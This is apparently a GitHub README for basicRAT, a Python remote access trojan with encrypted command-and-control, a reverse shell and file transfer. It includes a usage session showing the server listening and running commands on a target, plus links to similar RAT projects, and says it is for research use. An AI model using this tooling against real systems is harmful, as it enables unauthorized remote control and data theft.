# basicRAT

This is a boilerplate Python RAT (Remote Access Trojan). I created this to maintain a bare-bones, clean design Python RAT with only essential features. My goal is to use basicRAT as a starting point to create other RATs that use various common-place protocols for C2.

**Disclaimer: This RAT is for research purposes only, and should only be used on authorized systems. Accessing a computer system or network without authorization or explicit permission is illegal.**

## Features
* Cross-platform
* AES CBC Encrypted C2
* Reverse Shell
* File upload/download

## Usage
```
$ python basicRAT_server.py 1337

 ____    ____  _____ ____   __  ____    ____  ______      .  ,
 |    \  /    |/ ___/|    | /  ]|    \  /    ||      |    (\;/)
 |  o  )|  o  (   \_  |  | /  / |  D  )|  o  ||      |   oo   \//,        _
 |     ||     |\__  | |  |/  /  |    / |     ||_|  |_| ,/_;~      \,     / '
 |  O  ||  _  |/  \ | |  /   \_ |    \ |  _  |  |  |   "'    (  (   \    !
 |     ||  |  |\    | |  \     ||  .  \|  |  |  |  |         //  \   |__.'
 |_____||__|__| \___||____\____||__|\_||__|__|  |__|       '~  '~----''
          https://github.com/vesche/basicRAT

basicRAT server listening on port 1337...

basicRAT> help

download <file> - Download a file.
help            - Show this help menu.
run <command>   - Execute a command on the target.
upload <file>   - Upload a file.
quit            - Gracefully kill client and server.

basicRAT> run uname -a
Linux sandbox3 4.7.6-1-ARCH #1 SMP PREEMPT Fri Sep 30 19:28:42 CEST 2016 x86_64 GNU/Linux
```

## Notes
* The ELF was created using [PyInstaller](http://www.pyinstaller.org/).
* Key was generated with `binascii.hexlify(os.urandom(16))`

## Other open-source Python RATs for Reference
* [ahhh/Reverse_DNS_Shell](https://github.com/ahhh/Reverse_DNS_Shell)
* [sweetsoftware/Ares](https://github.com/sweetsoftware/Ares)
